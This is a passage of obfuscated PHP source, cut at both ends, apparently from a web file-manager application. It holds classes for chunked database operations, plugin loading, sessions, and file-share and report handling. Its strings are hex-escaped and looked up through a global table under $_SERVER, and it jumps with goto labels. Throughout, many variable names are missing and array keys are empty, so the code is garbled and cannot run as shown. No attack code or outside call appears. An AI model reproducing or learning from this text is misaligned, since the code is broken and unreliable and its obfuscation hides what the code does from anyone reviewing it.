dataAfterFilter(&$Ȗ) { $ =& $_SERVER[]; foreach ($this->dataAuto as $ѠԷ) { $ = $ѠԷ[0]; if (!isset($Ȗ[$])) { continue; } if (!in_array($[401], explode($[50], $ѠԷ[2]))) { continue; } switch (trim($ѠԷ[3])) { case $[365]: case $[366]: $ = isset($ѠԷ[4]) ? (array) $ѠԷ[4] : array(); array_unshift($, $Ȗ[$]); if (isset($ѠԷ[4]) && $ѠԷ[4] == $[421]) { $ = array($Ȗ[$]); } if ($[365] == $ѠԷ[3]) { $Ȗ[$] = call_user_func_array($ѠԷ[1], $); } else { $Ȗ[$] = call_user_func_array(array(&$this, $ѠԷ[1]), $); } break; case $[314]: if (isset($Ȗ[$]) && $Ȗ[$]) { $Ȗ[$] = call_user_func_array(array(&$this, $ѠԷ[1]), array($Ȗ[$])); } break; case $[317]: $Ȗ[$] = $Ȗ[$ѠԷ[1]]; break; case $[338]: $̘ = $Ȗ[$]; $Ȗ[$] = json_decode($̘, !0); if (is_null($Ȗ[$])) { $Ȗ[$] = $̘; } break; case $[367]: if ($Ȗ[$] === $[12]) { unset($Ȗ[$]); } break; case $[368]: $Ȗ[$] = $ѠԷ[1]; break; default: break; } } } public function saveAll($) { $՟ =& $_SERVER[]; $֋ = $this->tablePrefix . $this->tableName; $ɗ = self::SQL_WHERE_IN_CHUNK; $ = is_array($) ? $ : array(); $ = $՟[422]; $ʷǩ = 0; $ȹ = array(); $ = count($); for ($ = 0; $ < $; $++) { $ = $[$]; if (!is_array($) || count($) != 4) { continue; } $ = "\125\x50\104\x41\124\x45\40\x60{$֋}\140\x20\123\x45\x54\x20{$[2]}\40\75\40\x43\x41\123\105\40{$[0]}\40\xa"; if ($ʷǩ == 0) { $ = $; } $ȹ[] = $՟[118] . $[1] . $՟[118]; $ʷǩ++; $ .= "\40\x57\110\105\x4e\x20\47{$[1]}\x27\40\x54\110\105\116\x20\x27{$[3]}\47\40\xa"; if ($ʷǩ == $ɗ || $ == $ - 1) { $ = implode($՟[50], $ȹ); $ .= "\40\105\x4e\104\x20\40\127\x48\105\x52\105\40{$[0]}\x20\111\116\x20\50{$}\x29\40"; $this->execute($); $ʷǩ = 0; $ = $; $this->chunkEventCheck(count($ȹ)); $ȹ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ư) { $ =& $_SERVER[]; $ = $this->tablePrefix . $this->tableName; foreach ($ư as $٠) { if (!is_array($٠) || count($٠) != 4) { continue; } $޽ = $٠[0] . $[423] . $٠[1] . $[118]; $ = $٠[2] . $[423] . $٠[3] . $[118]; $Ǉ = "\165\x70\144\141\x74\x65\x20{$}\40\x73\145\x74\40{$}\40\167\x68\145\162\145\40{$޽}\73"; $this->execute($Ǉ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ĭ = false, $ۍ = false) { $this->_chunkEvent = $Ĭ; $this->_chunkEventParam = $ۍ; } private function chunkEventCheck($ɛ) { if (!$this->_chunkEvent) { return; } $ŉ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ŉ[$_SERVER[][424]] = $ɛ; Hook::trigger($this->_chunkEvent, $ŉ); } public function addAll($, $ = array(), $٬ = false) { $ =& $_SERVER[]; ignore_timeout(); $〞 = self::SQL_WHERE_IN_CHUNK; if (empty($)) { $this->error = think_lang($[315]); return !1; } $ = $this->_parseOptions($); foreach ($ as $ => $) { $[$] = $this->_facade($); $this->_beforeInsert($[$], $); } if (method_exists($this->db, $[316])) { for ($ = 0; $ < count($); $ += $〞) { $и = array_slice($, $, $〞); if (!is_array($и) || count($и) == 0) { break; } $㪝 = $this->db->insertAll($и, $, $٬); $this->chunkEventCheck(count($и)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ as $ => $) { $㪝 = $this->db->insert($, $, $٬); } $this->commit(); } if (!1 !== $㪝) { $ = $this->getLastInsID(); if ($) { return $; } } return $㪝; } public function save($Ӂء = '', $ݢ = array()) { $ت =& $_SERVER[]; $ = self::SQL_WHERE_IN_CHUNK; $ݰ = $this->optionsValue(); $ǒ = $this->findWhereField($ݰ); if (!$ǒ) { return parent::save($Ӂء, $ݢ); } $Ơ = 0; $څ = $ݰ[$ت[319]][$ǒ][1]; $څ = is_array($څ) ? $څ : array(); $ᛤ = count($څ); for ($Ұ = 0; $Ұ < $ᛤ; $Ұ += $) { $ = array_slice($څ, $Ұ, $); if (!is_array($) || count($) == 0) { break; } $ݰ[$ت[319]][$ǒ][1] = $; $this->optionsValue($ݰ); $Ơ += parent::save($Ӂء, $ݢ); $this->chunkEventCheck(count($)); } $this->chunkEventSet(); return $Ơ; } public function add($ = '', $޸ = array(), $ = false) { if ($this->addTaskStatus && is_array($)) { $this->addTaskData[] = $; return; } return parent::add($, $޸, $); } public function parseWhereLike($񭄡ƣ, $ː = '', $ = false, &$ = false) { $ =& $_SERVER[]; $ = $GLOBALS[$[6]][$[425]]; if (!$[$[426]]) { return $񭄡ƣ; } if (!is_array($񭄡ƣ)) { return $񭄡ƣ; } $ڊ = array(); $ = 0; foreach ($񭄡ƣ as $м => $˝) { if (is_array($˝) && count($˝) == 2 && $˝[0] == $[427] && is_string($˝[1]) && substr($˝[1], 0, 1) == $[428] && substr($˝[1], strlen($˝[1]) - 1, 1) == $[428]) { $ = !0; $ = is_string($м) ? $м : $ː; $őЙ = substr($˝[1], 1, strlen($˝[1]) - 2); $őЙ = $this->db->escapeString($őЙ); if (!strpos($, $[10])) { $ = $[429] . $ . $[429]; } $ҥ = $[203] . $őЙ . $[203]; $őЙ = str_replace(array($[10], $[430], $[11]), $[431], $őЙ); if ($[$[432]]) { $ҥ = $[433] . $őЙ . $[434]; if ($[$[435]]) { $ҥ = $[434] . $őЙ . $[433]; } } $ڊ[$] = $[436] . $ . $[437] . $ҥ . $[438]; $++; continue; } if (is_array($˝)) { $ː = is_string($м) ? $м : $ː; $˝ = $this->parseWhereLike($˝, $ː, !0, $); } if (is_numeric($м)) { $ڊ[$] = $˝; $++; } else { $ڊ[$м] = $˝; } } if ($ && !$) { } return $ڊ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ฝ = array()) { $ĮĲ =& $_SERVER[]; $ = self::SQL_WHERE_IN_CHUNK; $ = $this->optionsValue(); $ = $this->findWhereField($); if (!$ || isset($[$ĮĲ[336]]) || isset($[$ĮĲ[397]])) { return parent::select($ฝ); } $졩Ն = $[$ĮĲ[319]][$][1]; $졩Ն = is_array($졩Ն) ? $졩Ն : array(); $ݜ = null; for ($ = 0; $ < count($졩Ն); $ += $) { $ޘ = array_slice($졩Ն, $, $); if (!is_array($ޘ) || count($ޘ) == 0) { break; } $[$ĮĲ[319]][$][1] = $ޘ; $this->optionsValue($); $ܩ = parent::select($ฝ); if (!$ܩ) { continue; } $ݜ = is_array($ݜ) ? $ݜ : array(); $ݜ = array_merge($ݜ, $ܩ); } return $ݜ; } public function delete($Ϥ = array()) { $ňׂ =& $_SERVER[]; $ = self::SQL_WHERE_IN_CHUNK; $ = $this->optionsValue(); $̇ = $this->findWhereField($); if (!$̇) { return parent::delete($Ϥ); } $˪ = 0; $ˇ = $[$ňׂ[319]][$̇][1]; $ˇ = is_array($ˇ) ? $ˇ : array(); for ($뺏 = 0; $뺏 < count($ˇ); $뺏 += $) { $ = array_slice($ˇ, $뺏, $); if (!is_array($) || count($) == 0) { break; } $[$ňׂ[319]][$̇][1] = $; $this->optionsValue($); $˪ += parent::delete($Ϥ); } return $˪; } private function findWhereField($) { $뇽 =& $_SERVER[]; $ = self::SQL_WHERE_IN_CHUNK; if (!is_array($) || !is_array($[$뇽[319]])) { return !1; } foreach ($[$뇽[319]] as $ܿ => $) { if (is_array($) && isset($[0]) && is_string($[0]) && strtolower($[0]) == $뇽[7] && is_array($[1]) && count($[1]) > $) { ignore_timeout(); return $ܿ; } } return !1; } public function setMasterDB($鿚 = true) { think_config($_SERVER[][439], $鿚); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\155\x4f\160\x74\151\157\x6e"; public $field = array(); public function listData($ = false, $¥ = "\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\x65", $̟Ɩ = false) { $Ӡ = Model($this->modelType)->get(!1, $this->optionType, !0); $ = array_values($Ӡ); if ($ && $[0] && !is_array($[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ӡ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ӡ) { return $ ? null : array(); } if (!$) { $Ӡ = array_filter(array_values($Ӡ)); return array_sort_by($Ӡ, $¥, $̟Ɩ); } return $Ӡ[$_SERVER[][440] . $]; } public function insert($흖) { $׋ =& $_SERVER[]; $흖 = array_field_key($흖, $this->field); $ = Model($this->modelType)->get($׋[441], $this->optionType . $׋[442]); $ = $ ? $ : 0; $흖[$׋[443]] = ++$; $흖[$׋[215]] = time(); $흖[$׋[85]] = time(); Model($this->modelType)->set($׋[441], $, $this->optionType . $׋[442]); Model($this->modelType)->set($׋[440] . $, $흖, $this->optionType); return $; } public function update($՝, $) { $ⱘ =& $_SERVER[]; $ = array_field_key($, $this->field); $Ĥ = $this->listData($՝); if (!$Ĥ || !$՝) { return !1; } $ = array_merge($Ĥ, $); $[$ⱘ[85]] = time(); return Model($this->modelType)->set($ⱘ[440] . $՝, $, $this->optionType); } public function remove($˜) { if (!$˜) { return !1; } return Model($this->modelType)->remove($_SERVER[][440] . $˜, $this->optionType); } public function clear() { $ =& $_SERVER[]; Model($this->modelType)->remove($[441], $this->optionType . $[442]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ۺ, $) { if (!$) { return !1; } $ = $this->listData(); $ = array_to_keyvalue($, $ۺ); return isset($[$]) ? $[$] : !1; } public function findByName($) { return $this->findByKey($_SERVER[][32], $); } protected function resetData($ɯ) { $֌Ί =& $_SERVER[]; $ɯ = is_array($ɯ) ? $ɯ : array(); $ނǁ = array(); for ($ȯ = 0; $ȯ < count($ɯ); $ȯ++) { $ނǁ[$֌Ί[440] . $ɯ[$ȯ][$֌Ί[443]]] = $ɯ[$ȯ]; } return Model($this->modelType)->set($ނǁ, !1, $this->optionType); } private function getAutoName($癿) { $ = array_to_keyvalue($this->listData(), $_SERVER[][32]); if (!$ || !isset($[$癿])) { return $癿; } for ($ = 1; $ < count($); $++) { $߀ = $癿 . "\50{$}\x29"; if (!isset($[$߀])) { return $߀; } } return $߀; } } goto C⩑Ѯ; B: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x70\x6c\x75\147\x69\x6e\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x73\164\x61\164\x75\x73", "\x72\x65\x67\151\x65\x73\x74", "\x63\157\156\x66\x69\147"); public function loadList($š = false) { $ = array_to_keyvalue($this->listData(), $_SERVER[][32]); if ($š) { return $[$š]; } return $; } public function init() { $ =& $_SERVER[]; Hook::trigger($[2005]); $馛 = $this->loadPluginList(); foreach ($馛 as $ڛ => $) { $ = $this->appAllow($ڛ, $); if (!$) { continue; } foreach ($[$[2006]] as $ => $) { Hook::bind($, $); } } Hook::trigger($[2007]); Hook::trigger(ACTION); } public function appAllow($ׄ, $, $ݸ = true) { $ =& $_SERVER[]; $ډٶ = PLUGIN_DIR . $ׄ . $[2008]; if (!is_array($) || !is_array($[$[2006]]) || $[$[784]] != 1 || !is_file($ډٶ)) { return !1; } if ($GLOBALS[$[536]] == 1) { if ($GLOBALS[$[6]][$[2009]] || !$GLOBALS[$[6]][$[2010]]) { return !0; } $ = explode($[50], strtolower($GLOBALS[$[6]][$[2010]])); return in_array(strtolower($ׄ), $) ? !1 : !0; } if ($ݸ && !Action($[2011])->checkAuth($ׄ)) { return !1; } return !0; } public function unInstall($) { $ =& $_SERVER[]; $ڬ = $this->loadList($); if (file_exists(PLUGIN_DIR . $)) { Hook::apply($ . $[2012]); } $this->remove($ڬ[$[443]]); } public function changeStatus($, $٭) { $ =& $_SERVER[]; $Ĵ = $this->loadList($); if ($٭) { Hook::apply($ . $[2013]); } $this->update($Ĵ[$[443]], array($[2014] => $٭)); } public function appRegist($ޫ, $殬) { $ =& $_SERVER[]; $ = $this->loadList($ޫ); if ($) { $this->update($[$[443]], array($[2006] => $殬)); } else { $̮٘ = array($[32] => $ޫ, $[2006] => $殬, $[784] => 0, $[6] => $this->getConfigDefault($ޫ)); $this->insert($̮٘); } } public function getConfigDefault($ó) { $ۯ =& $_SERVER[]; $₞ = array(); $ = $this->getPackageJson($ó); if (!$ && is_array($[$ۯ[2015]])) { return $₞; } foreach ($[$ۯ[2015]] as $ => $) { if (!isset($[$ۯ[418]]) || isset($₞[$])) { continue; } $₞[$] = $[$ۯ[418]]; } return $₞; } public function getPackageJson($Ђ) { return Hook::apply($Ђ . $_SERVER[][2016]); } public function getConfig($ɏ, $Ѱ = false) { $ =& $_SERVER[]; $鳉 = array(); $ = $this->loadList($ɏ); if ($ && is_array($[$[6]])) { $鳉 = $[$[6]]; } if (!$鳉 || $Ѱ) { $鳉 = $this->getConfigDefault($ɏ); } return $鳉; } public function setConfig($, $ = false) { $ =& $_SERVER[]; $ = $this->loadList($); if (!$) { return !1; } $Ì = $[$[6]]; if ($ == !1) { $Ì = array(); $ = $this->getConfigDefault($); } foreach ($ as $ => $) { $Ì[$] = is_string($) ? trim($) : $; } $this->update($[$[443]], array($[6] => $Ì)); } public function viewList() { $ =& $_SERVER[]; $ʼ = $this->loadList(); $this->pluginScan($ʼ); $ʼ = $this->loadPluginList(); $ĭ = array(); foreach ($ʼ as $Ŵ => $Ӌ݄) { unset($Ӌ݄[$[2006]], $Ӌ݄[$[6]]); $ = PLUGIN_DIR . $Ӌ݄[$[32]] . $[2008]; if (!is_file($)) { continue; } $ = Hook::apply($Ӌ݄[$[32]] . $[2016]); if (is_array($)) { $ĭ[$Ŵ] = array_merge($Ӌ݄, $); } } return $ĭ; } private function loadPluginList() { $笽 =& $_SERVER[]; $Ѡ = $this->loadList(); if (strtolower(MOD) == $笽[2017]) { return $Ѡ; } $׎ٮ = Hook::trigger($笽[2018], $Ѡ); if ($Ѡ && !$׎ٮ) { die; } return $׎ٮ ? $׎ٮ : $Ѡ; } private function pluginScan($ی) { $׶ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $ҏ, $遬, 0); foreach ($ҏ as $ͤ) { $ = get_path_this($ͤ); if (isset($ی[$]) || !file_exists($ͤ . $׶[2019]) || !file_exists($ͤ . $׶[2008])) { continue; } Hook::apply($ . $׶[2013]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\x73\145\x73\x73\151\157\156"; public function get($) { $ =& $_SERVER[]; $є = $this->where(array($[2020] => $))->find(); if (!is_array($є)) { return !1; } return $є[$[788]]; } public function set($, $ȗ, $ = 3600) { $ʹ =& $_SERVER[]; $ᣓ = array($ʹ[2020] => $, $ʹ[1924] => $ȗ, $ʹ[2021] => $ + time()); if (Session::get($ʹ[2022])) { $ᣓ[$ʹ[1687]] = Session::get($ʹ[2022]); } else { $ᣓ[$ʹ[1687]] = 0; } if ($this->get($)) { return $this->where(array($ʹ[2020] => $))->save($ᣓ); } else { return $this->add($ᣓ, array(), !0); } } public function remove($Ɗ) { return $this->where(array($_SERVER[][2020] => $Ɗ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2023] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\x54\151\155\x65", "\164\x69\x6d\145", "\151\x6e\163\145\162\x74\x2c\165\160\x64\x61\x74\x65", "\146\165\156\143\164\x69\x6f\x6e"), array("\x63\162\x65\141\164\145\124\x69\155\145", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\146\165\x6e\143\164\x69\157\x6e"), array("\x6f\160\164\151\x6f\156\x73", '', "\151\156\x73\145\162\164\54\x75\x70\x64\x61\164\x65\54\163\145\x6c\145\x63\164", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($) { $򏚗 =& $_SERVER[]; $ = isset($[0]) ? $[0] : !1; return array($򏚗[2024] => array(USER_ID, $򏚗[2025]), $򏚗[1965] => array($, $򏚗[2026])); } protected function listSimple() { $㎇ = array($_SERVER[][1687] => USER_ID); $ժ = $this->field($this->fieldList)->where($㎇)->select(); return $ժ ? $ժ : array(); } protected function getInfo($, $ĝ = false) { $Ք =& $_SERVER[]; if ($ĝ) { return $this->_getShareInfo(array($Ք[633] => $)); } $̏ = $this->cacheFunctionGet($Ք[1967], $); return $̏; } public function getInfoByHash($) { return $this->_getShareInfo(array($_SERVER[][2027] => $)); } public function getInfoByPath($ｈ) { $Í =& $_SERVER[]; $ӈ = array($Í[1687] => USER_ID, $Í[181] => $ｈ); return $this->_getShareInfo($ӈ); } public function getInfoBySourcePath($Ĉ) { $ά =& $_SERVER[]; $ = array($ά[1687] => USER_ID, $ά[1214] => $Ĉ); return $this->_getShareInfo($); } private function _getShareInfo($ܙ) { $ۯ =& $_SERVER[]; $ = $this->where($ܙ)->find(); if (!$) { return !1; } $ܙ = array($ۯ[633] => $[$ۯ[633]]); $尪 = $ۯ[2028]; $ = Model($ۯ[634])->order($ۯ[443])->field($尪)->where($ܙ)->select(); if ($[$ۯ[181]] == $ۯ[212]) { $[$ۯ[87]] = IO::info($[$ۯ[1214]]); } else { $[$ۯ[87]] = Model($ۯ[1373])->pathInfo($[$ۯ[181]]); } $[$ۯ[2029]] = $; return $; } protected function getInfoAuth($) { $ =& $_SERVER[]; $ = $this->getInfo($); if ($[$[1687]] == USER_ID) { $[$[455]] = $[$[87]][$[455]]; } else { $[$[455]] = Model($[535])->authMake($[$[2029]]); } return $; } protected function listData($ŀ = null, $Ț = 300) { $ԯ͸ =& $_SERVER[]; $ם = array(array($ԯ͸[530] => array($ԯ͸[1051], 0), $ԯ͸[631] => array($ԯ͸[1051], 0), $ԯ͸[2030] => $ԯ͸[1983])); if ($ŀ == $ԯ͸[2031]) { $ם = array($ԯ͸[530] => 1); } else { if ($ŀ == $ԯ͸[1200]) { $ם = array($ԯ͸[631] => 1); } } $ם[$ԯ͸[1687]] = USER_ID; $覡 = $this->where($ם)->selectPage($Ț); return $覡; } protected function listToMe($ = 300) { $䮻 =& $_SERVER[]; $χ̆ = Model($䮻[2032])->userGroupParents(USER_ID); $Ӄų = array($䮻[616] => SourceModel::TYPE_USER, $䮻[538] => USER_ID); if ($χ̆) { $Ӄų = array(array($䮻[616] => SourceModel::TYPE_USER, $䮻[538] => USER_ID), array($䮻[616] => SourceModel::TYPE_GROUP, $䮻[538] => array($䮻[7], $χ̆)), $䮻[2030] => $䮻[1983]); } $ = Model($䮻[634])->where($Ӄų)->selectPage($); $ = array_to_keyvalue_group($[$䮻[413]], $䮻[633]); if (!$) { return $; } $ = $䮻[2033]; $Ӄų = array($䮻[633] => array($䮻[460], array_keys($)), $䮻[1687] => array($䮻[1053], $䮻[212])); $즋 = $this->field($)->where($Ӄų)->select(); foreach ($즋 as $Ƞ鋸 => &$ίȄ) { $ίȄ[$䮻[2029]] = $[$ίȄ[$䮻[633]]]; } unset($ίȄ); $Ñ = array($䮻[2034] => $즋, $䮻[2035] => $[$䮻[410]]); return $Ñ; } protected function shareAdd($, $) { $ҟ刃 =& $_SERVER[]; $ͺ = $this->_addShareData($, $); if (!empty($[$ҟ刃[2036]])) { $this->_shareAuthSet($ͺ, $[$ҟ刃[2036]]); } $this->shareEventAdd($, $, $ҟ刃[2037]); return $ͺ; } protected function shareAddSystem($, $) { $ =& $_SERVER[]; $ = $this->_addShareData($, $, $[179]); $this->_shareAuthSet($, $[$[2036]]); return $; } private function shareEventAdd($, $̡, $ = "\141\x64\x64") { $ =& $_SERVER[]; if (!$ || $ == $[212]) { return; } if ($ == $[2037]) { if ($̡[$[530]] == $[88]) { Model($[601])->eventShare($, $[2038]); } if ($̡[$[631]] == $[88]) { Model($[601])->eventShare($, $[2039]); } return; } $Η = $this->getInfoByPath($); $ݦ = $[2040]; if ($Η[$[530]] == $[212] && $̡[$[530]] == $[88]) { $ݦ = $[2038]; } if ($Η[$[530]] == $[88] && $̡[$[530]] == $[212]) { $ݦ = $[2041]; } if ($Η[$[631]] == $[212] && $̡[$[631]] == $[88]) { $ݦ = $[2039]; } if ($Η[$[631]] == $[88] && $̡[$[631]] == $[212]) { $ݦ = $[2042]; } Model($[601])->eventShare($, $ݦ); return; } private function _addShareData($, $̿ = array(), $ϟ = false) { $Ոָ =& $_SERVER[]; $ = $ϟ == $Ոָ[179] ? 0 : USER_ID; $ҝ = array($Ոָ[459] => $, $Ոָ[1678] => $); if ($ == 0) { $ҝ = array($Ոָ[2043] => $̿[$Ոָ[1214]], $Ոָ[1678] => $); } if ($嗤 = $this->where($ҝ)->find()) { return $嗤[$Ոָ[633]]; } if ($ == 0) { $ҫŌ = array($Ոָ[32] => get_path_this($̿[$Ոָ[84]])); } else { $ҫŌ = Model($Ոָ[859])->sourceInfo($); if (!$ҫŌ) { return !1; } } if (!$̿[$Ոָ[1584]]) { $̿[$Ոָ[1584]] = $ҫŌ[$Ոָ[32]]; } $лϓ = array($Ոָ[1678] => $, $Ոָ[459] => $, $Ոָ[1584] => $Ոָ[12], $Ոָ[530] => 0, $Ոָ[631] => 0, $Ոָ[1214] => $Ոָ[12], $Ոָ[351] => $Ոָ[12], $Ոָ[928] => $Ոָ[12], $Ոָ[2044] => 0, $Ոָ[2045] => 0, $Ոָ[795] => 0, $Ոָ[2046] => $Ոָ[12], $Ոָ[2027] => $Ոָ[12]); $̏圤 = explode($Ոָ[50], $Ոָ[2047]); foreach ($̏圤 as $Ƥߝ) { if (!isset($̿[$Ƥߝ])) { continue; } $лϓ[$Ƥߝ] = $̿[$Ƥߝ]; } $ = $this->add($лϓ); $ζ = array($Ոָ[2027] => short_id($)); $this->where(array($Ոָ[2048] => $))->save($ζ); return $; } private function _shareAuthSet($, $琭) { $Ī =& $_SERVER[]; if (!is_array($琭)) { return !1; } $ = Model($Ī[1993]); $->where(array($Ī[633] => $))->delete(); $ӈہ = array(); foreach ($琭 as $ʭ¯) { $ = SourceModel::TYPE_USER; if ($ʭ¯[$Ī[178]] == SourceModel::TYPE_GROUP) { $ = SourceModel::TYPE_GROUP; } $ˋ = array($Ī[633] => $, $Ī[178] => $, $Ī[538] => intval($ʭ¯[$Ī[538]]), $Ī[1989] => 0, $Ī[2049] => -1); if ($ʭ¯[$Ī[1989]]) { $ˋ[$Ī[1989]] = $ʭ¯[$Ī[1989]]; } else { if ($ʭ¯[$Ī[2049]]) { $ˋ[$Ī[2049]] = $ʭ¯[$Ī[2049]]; } } $ӈہ[] = $ˋ; } return $->addAll($ӈہ, array(), !0); } public function numViewAdd($) { $ =& $_SERVER[]; $̰ = array($[2048] => $); $this->where($̰)->setAdd($[2044]); } public function numDownloadAdd($Á) { $Ğ =& $_SERVER[]; $ǆ = array($Ğ[2048] => $Á); $this->where($ǆ)->setAdd($Ğ[2045]); } protected function shareEdit($, $ڄ) { $ =& $_SERVER[]; $ = $this->getInfo($); if (!$) { return !1; } $this->_checkLinkShare($ڄ, $); $ݰ = array(); $ = explode($[50], $[2050]); foreach ($ as $ݕ) { if (!array_key_exists($ݕ, $ڄ)) { continue; } $ݰ[$ݕ] = $ڄ[$ݕ]; } $this->shareEventAdd($[$[181]], $ڄ, $[1855]); $this->where(array($[2048] => $))->save($ݰ); if (isset($ڄ[$[2036]])) { $this->_shareAuthSet($, $ڄ[$[2036]]); } return !0; } private function _checkLinkShare($, $ʳ) { $ʰ =& $_SERVER[]; if ($[$ʰ[530]] != $ʰ[88]) { return; } $ͪշ = $ʳ[$ʰ[87]][$ʰ[181]]; if ($ʳ[$ʰ[87]][$ʰ[33]] != $ʰ[214]) { $Ճ = $this->_folderReport($ͪշ); if (!$Ճ) { return; } show_json(LNG($ʰ[2051]) . $ʰ[2052] . $Ճ, !1); } $һ = Model($ʰ[859])->fileInfoGet($ʳ[$ʰ[87]][$ʰ[181]]); if (!$һ) { return; } $ = $this->shareFileMeta($һ[$ʰ[509]]); if (isset($[$ʰ[418]]) && $[$ʰ[418]] == $ʰ[88]) { show_json(LNG($ʰ[2053]), !1); } } private function _folderReport($̮) { $ =& $_SERVER[]; $䧔 = array($[509] => array($[1051], 0), $[784] => 3); $皫 = Model($[2054])->where($䧔)->field($[509])->select(); if (!$皫) { return !1; } $皫 = array_to_keyvalue($皫, $[12], $[509]); $ŷ = $[50] . $̮ . $[50]; $䧔 = array($[509] => array($[7], $皫), $[553] => array($[427], "\x25{$ŷ}\x25"), $[473] => 0); $ = Model($[859])->where($䧔)->field($[2055])->find(); if (!$) { return !1; } $ = substr($[$[553]], strpos($[$[553]], $ŷ)); $䧔 = array($[181] => array($[7], trim($, $[50]))); $č = Model($[859])->where($䧔)->field($[32])->select(); $ښɺ = array_to_keyvalue($č, $[12], $[32]); $ښɺ[] = $[$[32]]; return implode($[8], $ښɺ); } protected function remove($) { $Ѫ =& $_SERVER[]; if (is_array($)) { $ = array($Ѫ[7], $); } $ڥ = array($Ѫ[633] => $); $ = $this->where($ڥ)->delete(); if ($) { Model($Ѫ[634])->where(array($Ѫ[633] => $))->delete(); } $񌜥 = is_array($) ? $[1] : array($); for ($ۉ = 0; $ۉ < count($񌜥); $ۉ++) { $֯ = $this->getInfo($񌜥[$ۉ]); if ($֯[$Ѫ[631]] == $Ѫ[88]) { Model($Ѫ[601])->eventShare($֯[$Ѫ[181]], $Ѫ[2042]); } if ($֯[$Ѫ[530]] == $Ѫ[88]) { Model($Ѫ[601])->eventShare($֯[$Ѫ[181]], $Ѫ[2041]); } } return $; } protected function removeBySource($영) { $ְ =& $_SERVER[]; $ = array($ְ[459] => array($ְ[460], $영)); $ᶜ = $this->field($ְ[633])->where($)->select(); $ᶜ = array_to_keyvalue($ᶜ, $ְ[12], $ְ[633]); if (!$ᶜ) { return; } $ = array($ְ[2048] => array($ְ[460], $ᶜ)); $this->where($)->delete(); Model($ְ[634])->where($)->delete(); } public function listAll($) { $ =& $_SERVER[]; $و = array(); if ($[$[1687]]) { $و[$[1687]] = $[$[1687]]; } if ($[$[794]]) { $Ң = $[$[795]] ? $[$[795]] : strtotime(date($[2056])); $و[$[215]] = array($[377], array($[$[794]], $Ң)); } if ($[$[33]]) { $و[$[$[33]]] = 1; } else { $و[] = array($[530] => array($[1051], 0), $[631] => array($[1051], 0), $[2030] => $[1983]); } if ($[$[1979]]) { $و[] = array($[2027] => $[$[1979]], $[1584] => array($[427], "\x25{$[$[1979]]}\x25"), $[2030] => $[1983]); } $طἮ = $this->_makeOrder()->where($و)->selectPage(20); if (empty($طἮ[$[413]])) { return array(); } $this->_listDataApply($طἮ[$[413]]); return $طἮ; } public function listDataApply($) { $this->_listDataApply($); return $; } private function _listDataApply(&$Ժ) { $ʘ =& $_SERVER[]; $ = array_to_keyvalue($Ժ, $ʘ[12], $ʘ[1687]); $Π = Model($ʘ[567])->userListInfo(array_unique($)); $ᗠ = array_to_keyvalue($Ժ, $ʘ[12], $ʘ[181]); $ = Model($ʘ[859])->sourceListInfo($ᗠ, !0); foreach ($Ժ as $ => &$¢) { $ = $¢[$ʘ[1687]]; $¢[$ʘ[2057]] = $Π[$] ? $Π[$] : !1; $͸ = $¢[$ʘ[181]]; $¢[$ʘ[87]] = $[$͸] ? $[$͸] : !1; if ($¢[$ʘ[87]][$ʘ[473]] == $ʘ[88]) { unset($Ժ[$]); } if ($¢[$ʘ[87]] != $ʘ[212] && !$¢[$ʘ[87]]) { unset($Ժ[$]); } } unset($¢); $Ժ = array_values($Ժ); } private function _makeOrder($ = '') { $ =& $_SERVER[]; $ = array($[215], $[795], $[2044], $[2045]); $ = array($[491] => $[492], $[493] => $[494]); $⿜ = Input::get($[498], $[7], $[465], $); $ꖰ = Input::get($[499], $[7], $[2058], array($[1976], $[493])); $ꖰ = $[$ꖰ]; $ = $ . "{$⿜}\x20{$ꖰ}"; return $this->order($); } public function reportAdd($) { $Ȑզ =& $_SERVER[]; $ = array($Ȑզ[633] => $[$Ȑզ[633]], $Ȑզ[1687] => USER_ID); if (Model($Ȑզ[2054])->where($)->find()) { return !1; } $ӣ = array($Ȑզ[633] => $[$Ȑզ[633]], $Ȑզ[1584] => $[$Ȑզ[1584]], $Ȑզ[181] => $[$Ȑզ[181]], $Ȑզ[509] => $[$Ȑզ[509]], $Ȑզ[1687] => USER_ID, $Ȑզ[33] => $[$Ȑզ[33]], $Ȑզ[494] => $[$Ȑզ[494]]); return Model($Ȑզ[2054])->add($ӣ); } public function reportList($) { $թ =& $_SERVER[]; $ = array(); if ($[$թ[794]]) { $Ɖ = $[$թ[795]] ? $[$թ[795]] : strtotime(date($թ[2056])); $[$թ[215]] = array($թ[377], array($[$թ[794]], $Ɖ)); } if (isset($[$թ[33]]) && in_array($[$թ[33]], array($թ[88], $թ[478], $թ[2059], $թ[2060], $թ[2061]))) { $[$թ[33]] = $[$թ[33]]; } if (isset($[$թ[784]]) && in_array($[$թ[784]], array($թ[212], $թ[88], $թ[478], $թ[2059]))) { $[$թ[784]] = $[$թ[784]]; } $⹴ڄ = Input::get($թ[499], $թ[7], $թ[2058], array($թ[1976], $թ[493])); $ = array($թ[491] => $թ[492], $թ[493] => $թ[494]); $ = $թ[2062] . $[$⹴ڄ]; $ = Model($թ[2054])->where($)->order($)->selectPage(20); if (empty($[$թ[413]])) { return array(); } $ = array_to_keyvalue_group($[$թ[413]], 